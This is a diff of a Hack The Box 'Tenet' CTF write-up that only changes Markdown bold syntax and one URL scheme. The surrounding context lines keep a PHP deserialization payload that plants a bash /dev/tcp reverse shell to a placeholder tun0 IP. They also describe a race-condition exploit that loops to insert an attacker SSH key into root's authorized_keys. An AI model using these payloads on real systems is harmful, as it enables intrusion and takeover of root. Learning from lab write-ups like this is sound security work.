@@ -1,6 +1,6 @@
 ![](tenet_banner.png)
 
-<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="http://www.hackthebox.eu/badge/image/391067"></img></a>
+<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></img></a>
 </p>
 
 # Scanning
@@ -163,7 +163,7 @@ serialize(new DatabaseExport)
 `O:14:"DatabaseExport":2:{s:9:"user_file";s:8:"hush.php";s:4:"data";s:33:"<?php exec("/bin/bash -c \'bash -i > /dev/tcp/<tun0-IP>/4141 0>&1\'"); ?>";}`
 
 
-__unserialize data:__
+**unserialize data:**
 
 ```php
 __PHP_Incomplete_Class Object
@@ -178,12 +178,12 @@ so when this unserialize data run in the script it creats new `DatabaseExport` o
 
 so on behalf of the DatabaseExport class two new `DatabaseExport` objects created -
 
-__First:__
+**First:**
 ```php
 $databaseupdate = unserialize($input); -> new DatabaseExport;
 ```
 
-__Second:__
+**Second:**
 
 ```php
 $app = new DatabaseExport;
@@ -235,7 +235,7 @@ and `update_db()` function is exec in this object because `$app` is calling it w
 
 and `__destruct()` is the [magic method](https://www.php.net/manual/en/language.oop5.magic.php) and "The destructor method will be called as soon as there are no other references to a particular object."
 
-__Reference:__
+**Reference:**
 
 * ExploitDB documentation on [deserialization-vulnerability](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf)
 * ippsec Video on [PHP Deserialization](https://www.youtube.com/watch?v=HaW15aMzBUM&list=PLidcsTyj9JXJrgTzRYdwnUhUThb9bL9py&index=2)
@@ -369,7 +369,7 @@ User neil may run the following commands on tenet:
       neil@tenet:~$ ls -l /usr/local/bin/enableSSH.sh
       -rwxr-xr-x 1 root root 1080 Dec  8 13:46 /usr/local/bin/enableSSH.sh
 
-__Understanding the script code:__
+**Understanding the script code:**
 
 ```bash
 #!/bin/bash
@@ -409,7 +409,7 @@ checkAdded        //This function execute after key added to authorized_keys to 
 
 * ok, So everything is happning in the `addkey()` function. when `$tmpName` is created this script append his `$key` in that file and than add it into the root ssh authorized_keys.
 
-__Attack Surface:__
+**Attack Surface:**
 
 * the script first create tmp file and than add his key inside that file and if we add our key to that tmp file at same time when this script add his key our key also added to root ssh authorized_keys.
 * but script done all this work in less then a second and there is no way we can manually add our key to that tmp file for this we can create a loop which execute the script and echoing our ssh key at same time for N number of time -
@@ -418,7 +418,7 @@ __Attack Surface:__
 
   * i tried it multiple time and in 100 loop i get the sccusses
 
-__Getting Root shell:__
+**Getting Root shell:**
 
 * create ssh key and add public key into the loop.
 * running the loop -
@@ -438,7 +438,7 @@ __Getting Root shell:__
       1bec96c5************************
       root@tenet:~# 
 
-__Exploit Script__
+**Exploit Script**
 
 ```bash
 #!/bin/bash
@@ -464,7 +464,7 @@ ssh -i ./root_key root@10.10.10.223 'flag=$(find / -type f \( -name "user.txt" -
 
 ## inotify
 
-__[inotify](https://man7.org/linux/man-pages/man7/inotify.7.html)__ API provides a mechanism for monitoring filesystem events. Inotify can be used to monitor individual files, or to monitor directories. When a directory is monitored, inotify will return events for the directory itself, and for files inside the directory.
+**[inotify](https://man7.org/linux/man-pages/man7/inotify.7.html)** API provides a mechanism for monitoring filesystem events. Inotify can be used to monitor individual files, or to monitor directories. When a directory is monitored, inotify will return events for the directory itself, and for files inside the directory.
 
 * [inotify api example in c](https://linuxhint.com/inotify_api_c_language/)
 * ippsec explain in [tenet video](https://www.youtube.com/watch?v=LhdE7dXbTQw&t=1560s)
